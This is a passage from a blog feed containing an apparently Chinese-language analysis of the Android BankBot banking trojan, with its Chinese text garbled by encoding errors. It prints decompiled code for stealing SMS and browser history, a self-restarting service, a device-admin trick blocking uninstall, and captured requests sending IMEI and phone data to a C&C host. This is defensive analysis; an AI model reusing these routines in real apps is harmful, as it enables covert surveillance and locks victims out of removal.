JSONObject.quote(v8), JSONObject.quote(v13)));<br>            <span class="hljs-keyword">if</span>(!v10.isLast()) &#123;<br>                v20.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v10.moveToNext();<br>        &#125;<br><br>        v10.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v20.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–çŸ­ä¿¡è®°å½•"><a href="#è·å–çŸ­ä¿¡è®°å½•" class="headerlink" title="è·å–çŸ­ä¿¡è®°å½•"></a>è·å–çŸ­ä¿¡è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getSmsLog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(Uri.parse(<span class="hljs-string">&quot;content://ABC&quot;</span>.replace(<span class="hljs-string">&quot;A&quot;</span>, <br>            <span class="hljs-string">&quot;s&quot;</span>).replace(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>).replace(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>)), <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">while</span>(!v8.isAfterLast()) &#123;<br>            v10.append(String.format(Locale.US, <span class="hljs-string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, <br>                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="hljs-string">&quot;address&quot;</span>))), JSONObject<br>                    .quote(v8.getString(v8.getColumnIndex(<span class="hljs-string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(<br>                    v8.getColumnIndex(<span class="hljs-string">&quot;date&quot;</span>)))));<br>            <span class="hljs-keyword">if</span>(!v8.isLast()) &#123;<br>                v10.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v8.moveToNext();<br>        &#125;<br><br>        v8.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v10.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨ä¹¦ç­¾"><a href="#æµè§ˆå™¨ä¹¦ç­¾" class="headerlink" title="æµè§ˆå™¨ä¹¦ç­¾"></a>æµè§ˆå™¨ä¹¦ç­¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getHistory</span><span class="hljs-params">(Uri historyUri)</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(historyUri, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;title&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>, <br>            <span class="hljs-string">&quot;date&quot;</span>&#125;, <span class="hljs-string">&quot;bookmark = 0&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">while</span>(!v6.isAfterLast()) &#123;<br>            v8.append(String.format(Locale.US, <span class="hljs-string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject<br>                    .quote(v6.getString(v6.getColumnIndex(<span class="hljs-string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(<br>                    v6.getColumnIndex(<span class="hljs-string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(<br>                    <span class="hljs-string">&quot;date&quot;</span>)))));<br>            <span class="hljs-keyword">if</span>(!v6.isLast()) &#123;<br>                v8.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v6.moveToNext();<br>        &#125;<br><br>        v6.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v8.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"><a href="#éª—å–ä¿¡ç”¨å¡ä¿¡æ¯" class="headerlink" title="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"></a>éª—å–ä¿¡ç”¨å¡ä¿¡æ¯</h2><p>å½“ç”¨æˆ·æ‰“å¼€Google Play åº”ç”¨æ—¶ï¼Œæ‰“å¼€ä¼ªé€ çš„Activityï¼Œè¯±ä½¿ç”¨æˆ·è¾“å…¥ä¿¡ç”¨å¡ä¿¡æ¯ã€‚</p><h2 id="é«˜çº§æŠ€æœ¯"><a href="#é«˜çº§æŠ€æœ¯" class="headerlink" title="é«˜çº§æŠ€æœ¯"></a>é«˜çº§æŠ€æœ¯</h2><h3 id="ä¸æ–­é‡å¯çš„Servcie"><a href="#ä¸æ–­é‡å¯çš„Servcie" class="headerlink" title="ä¸æ–­é‡å¯çš„Servcie"></a>ä¸æ–­é‡å¯çš„Servcie</h3><p>com.android.smali3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>.onDestroy();<br>    <span class="hljs-built_in">this</span>.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.getApplicationContext(), smali3.class));<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡è¢«åœæ­¢ï¼Œç«‹å³é‡å¯ï¼Œæ— æ³•åœæ­¢ã€‚</p><h3 id="é˜²æ­¢å¸è½½"><a href="#é˜²æ­¢å¸è½½" class="headerlink" title="é˜²æ­¢å¸è½½"></a>é˜²æ­¢å¸è½½</h3><p>Bankbot ç”³è¯· Device Admin æƒé™ï¼Œæ— æ³•è¢«æ­£å¸¸å¸è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; adb shell pm uninstall com.android.market<br>Failure<br><br></code></pre></td></tr></table></figure><h3 id="ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™"><a href="#ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™" class="headerlink" title="ç¦æ­¢åˆ é™¤ Device Admin æƒé™"></a>ç¦æ­¢åˆ é™¤ Device Admin æƒé™</h3><p>è¿™ä¸ªä¸€ä¸ªéå¸¸æµæ°“çš„åšæ³•ï¼Œå…·ä½“çš„åšæ³•æ˜¯å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdRec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DeviceAdminReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AdRec</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> CharSequence <span class="hljs-title function_">onDisableRequested</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppCrash</span>().Register(context);<br>        <span class="hljs-keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span class="hljs-number">0xA</span>) &#123;<br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.settings.SETTINGS&quot;</span>);<br>            v2.setFlags(<span class="hljs-number">0x50000000</span>);<br>            context.startActivity(v2);<br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>);<br>            v4.addCategory(<span class="hljs-string">&quot;android.intent.category.HOME&quot;</span>);<br>            v4.setFlags(<span class="hljs-number">0x10000000</span>);<br>            context.startActivity(v4);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;<br>        &#125;<br><br>        context.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, ASec.class));<br>        <span class="hljs-type">long</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x7D0</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(v6);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(InterruptedException v3) &#123;<br>            v3.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;<br>    &#125;<br><br>   ...<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡å†™ DeviceAdminReceiver çš„ onDisableRequest æ–¹æ³•ã€‚ä½¿ç”¨ Thread.sleep æ–¹æ³•ä½¿ç”¨æˆ·<br>æ— æ³•æ“ä½œç•Œé¢ï¼Œåœ¨æ­¤æœŸé—´é‡‡å– Activity åˆ‡æ¢çš„æ–¹æ³•ç»•å¼€å–æ¶ˆæ¿€æ´»çš„æ­¥éª¤ã€‚</p><p>è¿™é‡Œå‡ºè¿‡å‡ ä¸ªé—®é¢˜ï¼Œ</p><ol><li>Backdoor.AndroidOS.Obad.a ä½¿ç”¨çš„ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­éšèº«</li><li>å°±æ˜¯ç°åœ¨ä»£ç ä¸­æ‰€ç”¨åˆ°è¿™ä¸ªï¼Œç›®å‰åœ¨æ‰€æœ‰çš„Android ç‰ˆæœ¬ä¸­å­˜åœ¨ã€‚</li></ol><h3 id="ç•Œé¢åŠ«æŒ"><a href="#ç•Œé¢åŠ«æŒ" class="headerlink" title="ç•Œé¢åŠ«æŒ"></a>ç•Œé¢åŠ«æŒ</h3><p>é€šè¿‡ç•Œé¢åŠ«æŒï¼Œè¯±ä½¿ç”¨æˆ·å°†Appè®¾ç½®ä¸ºè®¾å¤‡ç®¡ç†å™¨ã€‚ä»ä¸‹å›¾ä¸­å¯ä»¥çœ‹è§ContinuesæŒ‰é’®å…¶å®<br>æ˜¯è®¾å¤‡ç®¡ç†å™¨çš„æ¿€æ´»æŒ‰é’®ã€‚</p><h2 id="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"><a href="#ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ" class="headerlink" title="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"></a>ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ</h2><h2 id="0x02-C-C-åè®®åˆ†æ"><a href="#0x02-C-C-åè®®åˆ†æ" class="headerlink" title="0x02 C&amp;C åè®®åˆ†æ"></a>0x02 C&amp;C åè®®åˆ†æ</h2><p>Bankbot ä»¥å›ºå®šæ—¶é—´è½®è¯¢çš„æ–¹å¼å‘C&amp;CæœåŠ¡å™¨è¯·æ±‚å‘½ä»¤ï¼Œå‘½ä»¤çš„æ ¼å¼ä¸ºjsonæ ¼å¼ã€‚ä»ä»£ç ä¸­<br>å¯ä»¥å¾—åˆ°jsonå­—æ®µçš„ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_ACTION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;action&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_CALL_LOG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;call_log&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_DATA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;data&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_HISTORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;browser_history&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_IMEI</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;imei&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_INTERCEPT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;intercept&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_MAYHEM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mayhem&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_MESSAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prefix_1&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_NEW_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_NUMBER_SEND_TO</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;number_1&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_OPERATOR</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;op&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_PHONE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;phone&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_POLL_INTERVAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server_poll&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prefix&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_REPORT_CALLS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calls&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_SMS_HISTORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sms_history&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_SPAM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;text_2&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_STATUS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;status&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_URL_TO_SHOW</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;url&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_VERSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;version&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="è¯·æ±‚æ³¨å†Œ"><a href="#è¯·æ±‚æ³¨å†Œ" class="headerlink" title="è¯·æ±‚æ³¨å†Œ"></a>è¯·æ±‚æ³¨å†Œ</h3><p>è¿”å›æŠ¥æ–‡</p><p>401</p><h3 id="æ³¨å†ŒæŠ¥æ–‡"><a href="#æ³¨å†ŒæŠ¥æ–‡" class="headerlink" title="æ³¨å†ŒæŠ¥æ–‡"></a>æ³¨å†ŒæŠ¥æ–‡</h3><p>è¯·æ±‚æŠ¥æ–‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/p/gate.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>106<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>quick-sshopping.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><br><span class="language-apache"><span class="hljs-attribute">action</span>=reg&amp;imei=<span class="hljs-number">098767899076562</span>&amp;phone=<span class="hljs-number">15802920457</span>&amp;op=Android&amp;version=<span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">4</span>%<span class="hljs-number">2</span>C3.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-gd853d22&amp;prefix=<span class="hljs-number">12</span>Jhw21</span><br></code></pre></td></tr></table></figure><p>å“åº”æŠ¥æ–‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.8.0<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 23 Feb 2016 07:25:21 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/5.5.31<br><br>3<br>200<br>0<br><br><br></code></pre></td></tr></table></figure><h3 id="è·å–å‘½ä»¤"><a href="#è·å–å‘½ä»¤" class="headerlink" title="è·å–å‘½ä»¤"></a>è·å–å‘½ä»¤</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/p/gate.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>32<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>quick-sshopping.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><br><span class="language-ini"><span class="hljs-attr">action</span>=poll&amp;imei=<span class="hljs-number">098767899076562</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.8.0<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 23 Feb 2016 07:25:30 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/5.5.31<br><br>0<br><br><br></code></pre></td></tr></table></figure><p>è¿”å›çš„å‘½ä»¤ä¸ºjson æ ¼å¼ï¼Œä¸»è¦çš„æŒ‡ä»¤æœ‰ä¸‹é¢å‡ ä¸ªï¼Œ</p><table><thead><tr><th>æŒ‡ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>401</td><td>è¦æ±‚ bot æ³¨å†Œ</td></tr><tr><td>call_log</td><td>è·å–ç”µè¯è®°å½•, å‘é€åˆ°C&amp;C server</td></tr><tr><td>sms_history</td><td>è·å–çŸ­ä¿¡å†…å®¹ï¼Œå‘é€åˆ°C&amp;C server</td></tr><tr><td>browser_history</td><td>è·å–æµè§ˆå™¨ä¹¦ç­¾ï¼Œå‘é€åˆ°C&amp;C server</td></tr><tr><td>url</td><td>è®¿é—®url é“¾æ¥</td></tr><tr><td>server</td><td>æ›´æ¢C&amp;C server</td></tr><tr><td>intercept</td><td></td></tr><tr><td>server_poll</td><td>æ›´æ–°ä»æœåŠ¡å™¨è·å–å‘½ä»¤çš„æ—¶é—´é—´éš”</td></tr><tr><td>mayhem</td><td></td></tr><tr><td>calls</td><td></td></tr></tbody></table><p>ç›‘è§†æœåŠ¡äº†å¤§åŠå¤©ï¼Œæ²¡æœ‰æ”¶åˆ°æœ‰æ•ˆæŒ‡ä»¤ï¼Œçœ‹æ¥ä¸æ˜¯ç‰¹åˆ«æ´»è·ƒã€‚</p><h2 id="0x03æ¸…é™¤"><a href="#0x03æ¸…é™¤" class="headerlink" title="0x03æ¸…é™¤"></a>0x03æ¸…é™¤</h2><p>è¿™ä¸ªAppçš„æ¸…é™¤éå¸¸è´¹åŠ²ï¼ŒåŸå› å°±æ˜¯æ³¨å†Œä¸ºè®¾å¤‡ç®¡ç†å™¨çš„appä¸èƒ½å¸è½½ï¼Œè€Œè¿™ä¸ªAppåˆä½¿è¯ˆ<br>ä¸è®©æˆ‘ä»¬å–æ¶ˆè®¾å¤‡ç®¡ç†å™¨ï¼Œä¼°è®¡åªæœ‰rootçš„æœºå™¨ä¼šå¥½å¤„ç†ä¸€äº›ã€‚</p><h2 id="0x04æ€»ç»“"><a href="#0x04æ€»ç»“" class="headerlink" title="0x04æ€»ç»“"></a>0x04æ€»ç»“</h2><p>BankBot æ ·æœ¬ï¼Œä»£ç ç¼–å†™çš„ç›¸å½“è§„èŒƒï¼Œé£æ ¼ä¸¥è°¨ï¼Œæ˜¯æ­£è§„ç¨‹åºå‘˜çš„ä½œå“ã€‚ä½†è¡Œä¸ºéå¸¸æµæ°“ï¼Œ<br>å¾ˆé¡½å›ºï¼Œä¸å®¹æ˜“æ¸…é™¤ã€‚æ‰€ä»¥é‡åˆ°ç”³è¯·device admin æƒé™çš„ç¨‹åºä¸€å®šè¦å°å¿ƒè°¨æ…ï¼Œä»¥å…ä¸è‰¯<br>åæœã€‚è€ŒAndroidçš„ç•Œé¢åŠ«æŒä¹Ÿæ˜¯ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œä¼°è®¡åç»­åˆ©ç”¨è¿™äº›æŠ€æœ¯çš„æ¶æ„Appçš„æ•°é‡<br>ä¼šè¶Šæ¥è¶Šå¤šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux ä¸‹ä½¿ç”¨ç™¾åº¦ç½‘ç›˜</title>
    <link href="/cn/BaiduNetdisk/"/>
    <url>/cn/BaiduNetdisk/</url>
    
